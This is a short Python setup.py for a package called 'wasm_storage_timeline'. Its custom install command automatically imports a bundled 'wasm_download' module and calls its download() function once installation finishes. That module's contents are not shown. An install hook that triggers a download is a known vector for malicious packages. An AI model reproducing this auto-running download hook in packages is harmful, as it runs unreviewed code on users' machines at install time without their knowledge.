from setuptools import setup
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        import wasm_download
        wasm_download.download()


setup(
    name="wasm_storage_timeline",
    version="1.0.3",
    description="`Storage.Timeline` database WASM implementation.",
    author="Illiatea",
    author_email="illiatea2@gmail.com",
    py_modules=["wasm_execute", "wasm_download"],
    cmdclass={'install': PostInstallCommand},
    install_requires=['python-dotenv'],
)
